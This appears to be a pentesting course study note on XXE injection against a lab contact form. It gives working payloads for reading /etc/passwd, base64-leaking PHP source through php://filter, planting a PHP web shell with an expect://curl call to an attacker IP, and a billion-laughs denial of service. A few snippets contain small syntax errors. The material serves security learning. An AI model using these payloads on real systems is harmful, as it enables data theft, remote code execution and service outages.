---
title: b-Local File Disclosure
draft: false
tags:
  - xxe
---
Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.

## Identify

> **e.g** Contact Form Web Application

If we fill the contact form and click on `Send Data`, then intercept the request with Burp, we can see that the request is being sent in XML.

Once we send the request without any modification, we have a message saying `Check your email email@xxe.htb for further instruction.`.

This means the `email` element is being displayed so this would be our possible injection point. For now, we know that whatever value we place in the `<email></email>` element gets displayed in the HTTP response.

Let's try defining a new entity and then use it as a variable in the email element.

To define a new XML entity, we will add the following line after the first line in the XML input:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```


> **Note:** In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.

Now that we have created a XML entity called `company`, let's inject `&compay` inside `email` element and we will see the value we defined (`Inlane Freight`) is getting displayed.

```xml
<?xml version="1.0" encoding="UTF-8">
	<!DOCTYPE email[
	<!ENTITY company "Inlane Freight">
	]>
	<root>
		<name>
		First
		</name>
		<tel>
		</tel>
		<email>
		&company
		</email>
		<message?
		test
		</message>
	</root>
```

`This confirms that we are dealing with a web application vulnerable to XXE`.

> **Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

## Reading Sensitive Files

By adding `SYSTEM` keyword to the payload, we can read local files as such:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

## Reading Source Code

If we can read the source code, it is Whitebox Pentesting from that point.

Let's try the following entity:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///index.php">
]>
```

However, above won't work out somehow. 

This is because the file we are referencing is not in proper XML format, so it fails to be referenced as an external XML entity.

PHP provides wrapper filters that allows base64 encoding which will output with no break in XML format. 

To do this, we can use `php://filter/` wrapper:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Above will correctly return `index.php`.

However, above will only work with PHP web apps.

## RCE with XXE

If we can read local files, we can read files such as `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web apps by making a call to our server.

On PHP-based web application, we can execute commands through `PHP://expect` filter. But this requires `expect` module is installed and enabled.

`expect://whoami`

Most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing to the web app, and then we can interact with it.

We can write a basic PHP web shell and start a Python web server:

```shell-session
jadu101@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
jadu101@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> **Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.


> **Note:** The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.


## Other XXE Attacks

DOS

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```
